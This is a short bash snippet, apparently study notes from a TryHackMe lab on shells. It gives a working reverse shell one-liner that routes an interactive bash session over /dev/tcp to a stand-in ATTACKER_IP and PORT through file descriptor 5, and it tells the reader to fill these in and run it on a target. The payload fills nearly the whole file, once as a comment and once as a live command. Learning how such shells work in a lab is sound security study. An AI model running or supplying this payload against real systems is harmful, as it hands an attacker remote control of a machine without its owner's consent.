# Bash Reverse Shell with File Descriptor 5
# Source: TryHackMe - Shells Overview, Task 6
# Usage: replace ATTACKER_IP and PORT, then run on target
#
#   bash -i 5<> /dev/tcp/ATTACKER_IP/PORT 0<&5 1>&5 2>&5
#
# Opens interactive bash (-i) using fd 5 for input and output.
# Enables interactive session over TCP connection.

bash -i 5<> /dev/tcp/ATTACKER_IP/PORT 0<&5 1>&5 2>&5
